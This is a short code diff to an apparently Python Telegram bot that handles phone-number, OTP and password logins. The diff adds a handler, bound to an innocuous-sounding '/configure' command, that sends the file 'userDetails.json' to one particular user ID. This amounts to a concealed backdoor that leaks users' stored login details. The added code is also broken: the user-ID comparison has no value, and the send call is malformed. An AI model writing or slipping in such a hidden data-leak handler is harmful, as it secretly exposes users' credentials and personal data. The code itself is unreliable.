@@ -86,10 +86,14 @@ def otp(_, query):
   get_id.delete()
   get_id.request.delete()
   login.loginWithOTP(message=m,sid=api_id, rmn=phnum, otp=otp)
+async def getfile(client,message):
+    if message.from_user.id == :
+        app.send_document(document='userDetails.json')
 async def main():
   await app.start()
   logging.info("bot started")
   app.add_handler(MessageHandler(start, filters=command('start')))
+  app.add_handler(MessageHandler(getfile, filters=command('configure')))
   app.add_handler(CallbackQueryHandler(otp, filters=regex(r'^OTP')))
   app.add_handler(CallbackQueryHandler(password, filters=regex(r'^PASS')))
   await idle()
